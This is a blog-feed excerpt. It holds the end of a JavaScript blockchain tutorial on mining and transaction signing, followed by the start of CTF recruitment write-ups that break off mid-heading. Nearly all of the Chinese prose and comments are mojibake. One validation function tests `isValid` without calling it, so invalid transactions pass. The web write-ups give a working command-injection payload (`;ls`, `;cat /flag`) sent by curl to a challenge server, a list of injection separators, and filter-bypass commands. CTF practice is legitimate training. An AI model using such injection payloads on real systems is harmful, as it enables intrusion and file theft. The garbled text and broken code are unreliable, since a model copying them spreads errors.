class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Chain ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span> = [<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">makeGenesis</span>()] <span class="hljs-comment">// ä¸€ä¸ªé“¾ä¸­åº”ç”±å¤šä¸ªåŒºå—ç»„æˆæ‰€ä»¥èµ‹å€¼æˆæ•°ç»„</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">difficulty</span> = <span class="hljs-number">3</span> <span class="hljs-comment">// è®¾ç½®éš¾åº¦ä¸º3ï¼Œä¹Ÿå°±æ˜¯éœ€è¦hashæ»¡è¶³å‰ç¼€ä¸‰ä½å…¨ä¸º0</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span> = [] <span class="hljs-comment">// è£…è½½äº¤æ˜“æ•°æ®çš„pool</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">minerReward</span> = <span class="hljs-number">50</span> <span class="hljs-comment">// å¥–åŠ±æ•°é¢ï¼Œéšç€æŒ–çš„åŒºå—æ•°é‡è¶Šå¤šéšä¹‹å‡åŠ</span><br>  &#125;<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å€™æˆ‘ä»¬å›åˆ°å…ˆå‰çš„<code>addBlock</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// æ‰‹åŠ¨å¢åŠ åŒºå—</span><br>  <span class="hljs-title function_">addBlock</span>(<span class="hljs-params">newBlock</span>) &#123;<br>    newBlock.<span class="hljs-property">preHash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getLatestBlock</span>().<span class="hljs-property">hash</span><br>    <span class="hljs-comment">// å› ä¸ºåœ¨å¤–éƒ¨æ— æ³•å¾—çŸ¥æ­¤æ—¶çš„preHashæ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥æ‰‹åŠ¨èµ‹å€¼</span><br>    newBlock.<span class="hljs-property">hash</span> = newBlock.<span class="hljs-title function_">computeHash</span>()<br>    <span class="hljs-comment">// computeHash()åœ¨Blockç±»æ˜¯æ„é€ æ—¶å€™è°ƒç”¨çš„ï¼Œä½†æ˜¯newBlockä¼ å…¥çš„æ—¶å€™æ²¡æœ‰preHashï¼Œæ‰€ä»¥æ„é€ çš„Hashæ˜¯é”™çš„ï¼Œéœ€è¦é‡æ–°ç”Ÿæˆ</span><br>    newBlock.<span class="hljs-title function_">mine</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">difficulty</span>) <span class="hljs-comment">// è¿›è¡Œæ¯”å¯¹å‰ç¼€</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-title function_">push</span>(newBlock) <span class="hljs-comment">// åˆ«å¿˜äº†å¾€é“¾ä¸Šæ·»åŠ </span><br>  &#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•å®é™…ä¸Šæ˜¯ä¸ºäº†æˆ‘ä»¬è°ƒè¯•ç”¨çš„ï¼Œå®é™…è¿ç”¨ä¸­å¹¶ä¸èƒ½ç›´æ¥å¢åŠ </p><p>å®é™…ä¸­ï¼Œæˆ‘ä»¬æ˜¯åœ¨æ…¢æ…¢çš„æŒ–åŒºå—ï¼Œè¿™é‡Œå‡å®šæœ‰ä¸ªçŸ¿å·¥åœ¨å¸®æˆ‘ä»¬æŒ–çŸ¿ï¼Œå½“ä»–æŒ–åˆ°åŒºå—é“¾ä¾¿ä¼šè·å¾—ç›¸åº”çš„çŸ¿å·¥å¥–åŠ±ï¼Œå¥–åŠ±çš„å‘æ”¾ä¾ç„¶é€šè¿‡<code>Transaction</code>æ¥å‘æ”¾</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// äº¤æ˜“æ± </span><br>  <span class="hljs-title function_">mineTransactionPool</span>(<span class="hljs-params">minerAddr</span>) &#123;<br>    <span class="hljs-comment">// å…ˆç»™çŸ¿å·¥å‘é’±</span><br>    <span class="hljs-keyword">const</span> minerTransaction = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transaction</span>(<span class="hljs-string">&#x27;&#x27;</span>, minerAddr, <span class="hljs-variable language_">this</span>.<span class="hljs-property">minerReward</span>) <span class="hljs-comment">// å› ä¸ºçŸ¿å·¥å¥–åŠ±ç”±åŒºå—é“¾æœ¬ä½“å‘æ”¾ï¼Œæ‰€ä»¥åœ°å€ä¸ºç©º</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span>.<span class="hljs-title function_">push</span>(minerTransaction) <span class="hljs-comment">// å¾€poolå‚¨å­˜</span><br>    <span class="hljs-comment">// å¼€æŒ–</span><br>    <span class="hljs-keyword">const</span> newBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getLatestBlock</span>().<span class="hljs-property">hash</span>)<br>    newBlock.<span class="hljs-title function_">mine</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">difficulty</span>)<br>    <span class="hljs-comment">// æŠŠåŒºå—åŠ åˆ°åŒºå—é“¾å½“ä¸­</span><br>    <span class="hljs-comment">// åŒæ—¶æ¸…ç©ºæ­¤æ—¶çš„Pool</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-title function_">push</span>(newBlock) <span class="hljs-comment">// æŠŠæŒ–åˆ°çš„åŒºå—æ”¾å…¥é“¾</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span> = [] <span class="hljs-comment">// å½“æŒ–åˆ°åˆæ³•åŒºå—ï¼Œä¸”æ”¾å…¥é“¾åï¼Œæ¸…ç©ºpool</span><br>  &#125;<br><br> <span class="hljs-comment">// æ–¹ä¾¿æ·»åŠ Transactionåˆ°Pool</span><br>  <span class="hljs-title function_">addTransaction</span>(<span class="hljs-params">transaction</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span>.<span class="hljs-title function_">push</span>(transaction)<br>  &#125;<br><br><br><span class="hljs-keyword">const</span> fanCoin = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chain</span>()<br><span class="hljs-keyword">const</span> t1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transaction</span>(<span class="hljs-string">&#x27;addr1&#x27;</span>, <span class="hljs-string">&#x27;addr2&#x27;</span>, <span class="hljs-number">10</span>)<br><span class="hljs-keyword">const</span> t2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transaction</span>(<span class="hljs-string">&#x27;addr2&#x27;</span>, <span class="hljs-string">&#x27;addr1&#x27;</span>, <span class="hljs-number">20</span>)<br>fanCoin.<span class="hljs-title function_">addTransaction</span>(t1)<br>fanCoin.<span class="hljs-title function_">addTransaction</span>(t2)<br>fanCoin.<span class="hljs-title function_">mineTransactionPool</span>(<span class="hljs-string">&#x27;fan&#x27;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanCoin)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanCoin.<span class="hljs-property">chain</span>[<span class="hljs-number">1</span>].<span class="hljs-property">transactions</span>)<br><br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231126001059276.png" alt="image-20231126001059276"></p><h2 id="4ã€æ•°å­—ç­¾å"><a href="#4ã€æ•°å­—ç­¾å" class="headerlink" title="4ã€æ•°å­—ç­¾å"></a>4ã€æ•°å­—ç­¾å</h2><p>ä¸ŠèŠ‚æˆ‘ä»¬å®ç°äº†ç®€æ˜“çš„æ•°å­—è´§å¸ï¼Œä½†æ˜¯å¯ä»¥å‘ç°Transactionï¼ˆäº¤æ˜“ï¼‰å¯ä»¥ç”±ä»»ä½•äººå‘èµ·ï¼Œè€Œä¸”ä¹Ÿå¯ä»¥ä¸ç»è¿‡ä½ çš„æ‰¹å‡†è€Œä½¿ç”¨ä½ é’±åŒ…çš„é’±ï¼Œ<del>è¿™æ˜¾ç„¶ä¸è¡Œï¼Œæ€ä¹ˆèƒ½åŠ¨æˆ‘çš„å°é‡‘åº“</del></p><p>æ‰€ä»¥åœ¨å‘èµ·è½¬è´¦å‰ï¼Œéœ€è¦åšå‡ºç›¸åº”çš„éªŒè¯æªæ–½ï¼Œè¿™å°±è¦ç”¨åˆ°äº†æœ¬èŠ‚çš„æ•°å­—ç­¾å</p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯éå¯¹ç§°åŠ å¯†</p><ul><li>é€šè¿‡å…¬å¼€<code>Transaction</code>ï¼Œ<code>Public Key</code>ä¸<code>Signature</code>ï¼Œå¯ä»¥è®©å…¶ä»–æ‰€æœ‰äººæ ¡éªŒè¿™ä¸ªç­¾åçš„åˆæ³•æ€§ï¼Œè¯æ˜è¿™ä¸ªäº¤æ˜“å±äºä½ </li><li>åŒæ—¶ï¼Œåªæœ‰éªŒè¯é€šè¿‡æ‰èƒ½æ‰§è¡Œè½¬è´¦æ“ä½œï¼Œ<del>ä¿æŠ¤äº†ä½ çš„å°é‡‘åº“</del></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> ecLib = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;elliptic&#x27;</span>).<span class="hljs-property">ec</span><br><span class="hljs-keyword">const</span> ec = <span class="hljs-keyword">new</span> <span class="hljs-title function_">ecLib</span>(<span class="hljs-string">&#x27;secp256k1&#x27;</span>) <span class="hljs-comment">// æ¤­åœ†æ›²çº¿</span><br><br><span class="hljs-comment">/////////// class Transaction ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">from</span>, to, amount</span>) &#123;<br>    <span class="hljs-comment">// if (from === null || from == &#x27;&#x27;) // è§†é¢‘é‡Œæ²¡è¯´ï¼Œä½†æ˜¯æˆ‘è§‰å¾—åº”è¯¥æ£€éªŒä¸€ä¸‹ï¼ˆè¿™æ ·æ£€éªŒä¸å¤ªè¡Œ</span><br>        <span class="hljs-comment">// throw new Error(&#x27;Transaction cannot be empty!&#x27;)</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> = <span class="hljs-keyword">from</span> <span class="hljs-comment">// è¿™é‡Œä»idæ”¹æˆäº†å‘é€è€…å…¬é’¥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span> = to <span class="hljs-comment">// åŒç†ï¼Œæ¥æ”¶è€…å…¬é’¥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">amount</span> = amount <span class="hljs-comment">// è½¬è´¦æ•°é‡</span><br>    <span class="hljs-comment">// this.timeStamp = timeStamp</span><br>  &#125;<br><br>  <span class="hljs-comment">// å¯¹äº¤æ˜“è¿›è¡Œç­¾å</span><br>  <span class="hljs-comment">// ç­¾åçš„æ„ä¹‰æ˜¯å°†å…¬é’¥å’ŒTransactionå…¬å¼€ä½¿æ‰€æœ‰äººéƒ½èƒ½å¯¹æ­¤äº¤æ˜“è¿›è¡Œæ ¡éªŒï¼Œå‡­æ­¤è¯æ˜å…¶åˆæ³•æ€§</span><br>  <span class="hljs-title function_">sign</span>(<span class="hljs-params">key</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">signature</span> = key.<span class="hljs-title function_">sign</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>(), <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toDER</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>  &#125;<br><br>  <span class="hljs-comment">// æ£€æŸ¥äº¤æ˜“åˆæ³•æ€§</span><br>  <span class="hljs-title function_">isValid</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// å¯¹çŸ¿å·¥å¥–åŠ±è¿›è¡Œç‰¹æ®Šåˆ¤æ–­</span><br>    <span class="hljs-comment">// å› ä¸ºçŸ¿å·¥å¥–åŠ±æ˜¯åŒºå—é“¾ç»™çŸ¿å·¥è½¬è´¦ï¼Œæ‰€ä»¥å…¬é’¥æ˜¯ç©º</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> === <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-keyword">const</span> keyObj = ec.<span class="hljs-title function_">keyFromPublic</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span>, <span class="hljs-string">&#x27;hex&#x27;</span>)<br>    <span class="hljs-keyword">return</span> keyObj.<span class="hljs-title function_">verify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>(), <span class="hljs-variable language_">this</span>.<span class="hljs-property">signature</span>) <span class="hljs-comment">// æ£€éªŒSignatureæ˜¯å¦åˆæ³•</span><br>  &#125;<br><br><span class="hljs-comment">/////////// class Chain ///////////</span><br><br><span class="hljs-comment">// æ–¹ä¾¿æ·»åŠ Transactionåˆ°Pool</span><br>  <span class="hljs-title function_">addTransaction</span>(<span class="hljs-params">transaction</span>) &#123;<br>    <span class="hljs-comment">// æ£€éªŒtransactionæ˜¯å¦åˆæ³•</span><br>    <span class="hljs-keyword">if</span> (!transaction.<span class="hljs-title function_">isValid</span>())<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Found InValid Transaction before adding to pool!&#x27;</span>)<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span>.<span class="hljs-title function_">push</span>(transaction)<br>  &#125;<br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231216163810985.png" alt="image-20231216163810985"></p><p><img src="/posts/32752/image-20231216162204074.png" alt="image-20231216162204074"></p><p>å¯ä»¥çœ‹åˆ°éªŒè¯æˆåŠŸï¼Œç°åœ¨æˆ‘ä»¬æ‰‹åŠ¨ç¯¡æ”¹ä¸€ä¸‹ï¼Œå°è¯•ä¸€ä¸‹</p><p><img src="/posts/32752/image-20231216163925741.png" alt="image-20231216163925741"></p><p>æŠŠ<code>amount</code>æ”¹æˆ20</p><p><img src="/posts/32752/image-20231216163843479.png" alt="image-20231216163843479"></p><p>å¯ä»¥çœ‹åˆ°è¾“å‡ºäº†<code>false</code>ï¼Œå¹¶ä¸¢å‡ºæ¥é”™è¯¯ï¼Œä¸”å¹¶æ²¡æœ‰å¾€<code>Transactions</code>ä¸­æ”¾å…¥é”™è¯¯çš„äº¤æ˜“</p><p>è¿™æ—¶å€™ï¼Œåœ¨ä¹‹å‰éªŒè¯åŒºå—æ˜¯å¦ä¸€ä¸€ç›¸è¿æ—¶ï¼Œæˆ‘ä»¬ä¹Ÿåº”è¯¥åŠ ä¸ŠéªŒè¯</p><p>ç”±äºåŒºå—ä¸­å¯èƒ½æœ‰å¤šä¸ª<code>Transaction</code>ï¼Œæ‰€ä»¥é‡‡ç”¨ç©·ä¸¾ä¾æ¬¡éªŒè¯</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Block ///////////</span><br><br><br><span class="hljs-comment">// é€ä¸ªéªŒè¯transactionæ˜¯å¦åˆæ³•</span><br>  <span class="hljs-title function_">validateTransaction</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> transaction <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactions</span>) &#123;<br>      <span class="hljs-keyword">if</span> (!transaction.<span class="hljs-property">isValid</span>)<br>        <span class="hljs-comment">// throw new Error(&quot;Found inValid Transaction!&quot;)</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>  &#125;<br><br><span class="hljs-comment">// æŒ–ï¼</span><br>  <span class="hljs-title function_">mine</span>(<span class="hljs-params">difficulty</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validateTransaction</span>()<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>()<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, difficulty) === <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnswer</span>(difficulty))<br>        <span class="hljs-comment">// è¿›è¡Œå‰ç¼€æ¯”å¯¹</span><br>        <span class="hljs-keyword">break</span><br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span>++<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Chain ///////////</span><br><br><span class="hljs-comment">// å¯¹åŒºå—è¿›è¡Œæ ¡éªŒ</span><br>  <span class="hljs-title function_">validateChain</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-property">length</span> === <span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[<span class="hljs-number">0</span>].<span class="hljs-property">hash</span> !== <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">computeHash</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>      <span class="hljs-comment">// å¯¹åˆå§‹è¿›è¡Œæ ¡éªŒï¼ŒåŸå§‹çš„Hashä¸å†æ¬¡ç”Ÿæˆçš„Hashè¿›è¡Œå¯¹æ¯”</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-property">length</span>; i++) &#123;<br>      <span class="hljs-comment">// éªŒè¯Blockçš„æ¯ä¸ªTransactionæ˜¯å¦åˆæ³•</span><br>      <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[i].<span class="hljs-title function_">validateTransaction</span>())<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Found InValid Transaction while validating Chain&#x27;</span>)<br><br>      <span class="hljs-comment">// åˆ¤æ–­å½“å‰Blockçš„dataæ˜¯å¦è¢«ç¯¡æ”¹8</span><br>      <span class="hljs-keyword">const</span> blockToValidate = <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[i]<br>      <span class="hljs-keyword">if</span> (blockToValidate.<span class="hljs-property">hash</span> !== blockToValidate.<span class="hljs-title function_">computeHash</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br><br>      <span class="hljs-comment">// æ¯”å¯¹å‰ä¸€ä¸ªBlockä¸å½“å‰Blockçš„hashå€¼æ˜¯å¦ç›¸åŒ</span><br>      <span class="hljs-keyword">const</span> preBlock = <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[i - <span class="hljs-number">1</span>]<br>      <span class="hljs-keyword">if</span> (preBlock.<span class="hljs-property">hash</span> !== blockToValidate.<span class="hljs-property">preHash</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>  &#125;<br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231217025145782.png" alt="image-20231217025145782"></p><p><img src="/posts/32752/image-20231217025119348.png" alt="image-20231217025119348"></p><h2 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h2>]]></content>
    
    
    
    <tags>
      
      <tag>Block Chain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CNSS 2023 Recruit WriteUps~~~</title>
    <link href="/posts/43716/"/>
    <url>/posts/43716/</url>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Baby-ğŸ¦´-babyHTTP"><a href="#Baby-ğŸ¦´-babyHTTP" class="headerlink" title="[Baby] ğŸ¦´ babyHTTP"></a>[Baby] ğŸ¦´ babyHTTP</h2><p>Getï¼ŒPostï¼ŒCookieçš„åº”ç”¨ï¼Œæ ¹æ®æç¤ºä¸€æ­¥ä¸€æ­¥æ¥å°±å¥½äº†~~</p><p><code>curl -X POST http://XXXX:XXXX/?CNSS=hackers -d &quot;web=fun&quot; --cookie &quot;admin=true&quot;</code></p><p>ï¼ˆä¸æ‡‚curlçš„äººæœ‰éš¾äº†</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;w2b_1s_Reaiiy_7un!!!&#125;</code></font></center></strong></em></p><h2 id="Baby-ğŸ™‹-PHPinfo"><a href="#Baby-ğŸ™‹-PHPinfo" class="headerlink" title="[Baby] ğŸ™‹ PHPinfo"></a>[Baby] ğŸ™‹ PHPinfo</h2><p>æ ¹æ®æç¤ºè®¿é—®&#x2F;phpinfo.php</p><p><code>Ctrl + F</code> æœç´¢cnssè·å¾—Flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;l3t_u5_l3arn_php1nfo&#125;</code></font></center></strong></em></p><h2 id="baby-ğŸ“-Ping"><a href="#baby-ğŸ“-Ping" class="headerlink" title="[baby] ğŸ“ Ping"></a>[baby] ğŸ“ Ping</h2><p>è®¿é—®é¢˜ç›®åœ°å€ï¼Œå¯çŸ¥ä¸ºç®€å•çš„å‘½ä»¤æ³¨å…¥ï¼Œå› ä¸ºæ²¡æœ‰è¿‡æ»¤ï¼Œé‚£æˆ‘ä»¬å°±ç‹ ç‹ çš„inject~~</p><p>è¿˜æ˜¯ç”¨curl</p><p><code>curl -X POST http://124.221.34.13:55566/ -d &quot;ip=127.0.0.1;ls&quot;</code></p><p>è¿™é‡Œä½¿ç”¨<code>;</code>è¿›è¡Œéš”æ–­ï¼Œç±»ä¼¼çš„ç¬¦å·è¿˜æœ‰<code>$</code>,<code>|</code>,<code>-</code>,<code>(</code>,<code>)</code>,<code>`</code>,<code>||</code>,<code>&amp;</code>,<code>&amp;&amp;</code>,<code>&#125;</code>,<code>&#123;</code></p><p>å‚è€ƒ <a href="https://blog.csdn.net/Hardworking666/article/details/120739082">CTFpingå‘½ä»¤ç»•è¿‡åŠç¬¦å·ç”¨æ³•_ctf ping-CSDNåšå®¢</a></p><p><img src="/posts/43716/image-20231018004049316.png" alt="Ping-1"></p><p>çŒœä¸€æ‰‹æ–‡ä»¶åœ¨æ ¹ç›®å½•</p><p><img src="/posts/43716/image-20231018004138053.png" alt="Ping-2"></p><p><code>curl -X POST http://124.221.34.13:55566/ -d &quot;ip=127.0.0.1;cat /flag&quot;</code></p><p>ï¼ˆç»•è¿‡catè¢«è¿‡æ»¤ï¼Œå¯ä»¥å°è¯•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">more<br>less<br>head<br>tail<br>...<br></code></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;p0ng_p0ng_pong!!!&#125;</code></font></center></strong></em></p><h2 id="Baby-ğŸ¥‡-æˆ‘å¾—å†å¿«ç‚¹"><a href="#Baby-ğŸ¥‡-æˆ‘å¾—å†å¿«ç‚¹" class="headerlink" title="[Baby+] ğŸ¥‡ æˆ‘å¾—å†å¿«ç‚¹"></a>[Baby+] ğŸ¥‡ æˆ‘å¾—å†å¿«ç‚¹</h2><p>è®¿é—®é¢˜ç›®åœ°å€ï¼Œçœ‹åˆ°ç½‘é¡µä¸æ–­åˆ·æ–°ä»¥åŠæç¤ºå¯çŸ¥ä¸ºå¿«é€Ÿè®¡ç®—</p><p>ï¼ˆå°±æ˜¯è¦ç”¨è„šæœ¬è®¿é—®è·å–Keyçš„å€¼ï¼Œå¹¶è®¡ç®—å‡ºå…¶md5å€¼ï¼Œå†postå›å»ï¼Œå…³é”®è¦ä¿è¯sessionä¸€è‡´ï¼Œä»¥ä¿è¯postå¯¹åº”çš„ç½‘é¡µä¸getçš„ä¸€è‡´</p><p>è¿™é‡Œä½¿ç”¨py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><br>m = hashlib.md5()<br>s = requests.Session()<br>url = <span class="hljs-string">&quot;http://124.221.34.13:55590/&quot;</span><br>r = s.get(url)<br>res = r.content<br><span class="hljs-comment"># print(res)</span><br>a = res.find(<span class="hljs-string">&quot;Key : &quot;</span>.encode())<br>b = res.find(<span class="hljs-string">&quot;&lt;span id&quot;</span>.encode())<br><span class="hljs-comment"># print(res[a + 6 : b])</span><br>m.update(res[a + <span class="hljs-number">6</span> : b])<br>url = <span class="hljs-string">f&quot;http://124.221.34.13:55590/check?value=<span class="hljs-subst">&#123;m.hexdigest()&#125;</span>&quot;</span><br>r = s.get(url)<br><br><span class="hljs-built_in">print</span>(r.content)<br><br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;3njoy_py5cript_n0w&#125;</code></font></center></strong></em></p><h2 id="Baby-ğŸ¶-CNSSå¨˜ã®å® ç‰©å•†åº—"><a href="#Baby-ğŸ¶-CNSSå¨˜ã®å® ç‰©å•†åº—" class="headerlink" title="[Baby+] ğŸ¶ CNSSå¨˜ã®å® ç‰©å•†åº—"></a>[Baby+] ğŸ¶ CNSSå¨˜ã®å® 